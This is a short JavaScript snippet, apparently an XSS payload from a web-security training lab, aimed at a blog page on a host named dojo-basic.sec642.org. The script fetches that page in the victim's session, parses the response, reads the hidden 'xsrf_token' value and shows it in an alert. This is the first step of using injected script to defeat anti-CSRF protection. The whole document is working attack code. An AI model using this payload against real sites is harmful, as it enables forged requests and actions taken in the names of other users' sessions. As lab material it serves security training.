var myxhrGET = new XMLHttpRequest();
var myuriGET = 'http://dojo-basic.sec642.org/index.php?page=add-to-your-blog.php&done=byxss'
myxhrGET.onreadystatechange = function() {
    if (myxhrGET.readyState == XMLHttpRequest.DONE) {
        var myresponse = myxhrGET.response;
        var mytoken = myresponse.getElementsByName("xsrf_token")[0].value;
        alert(mytoken);
    }
}
myxhrGET.open('GET', myuriGET, true);
myxhrGET.responseType = "document";
myxhrGET.send(null);
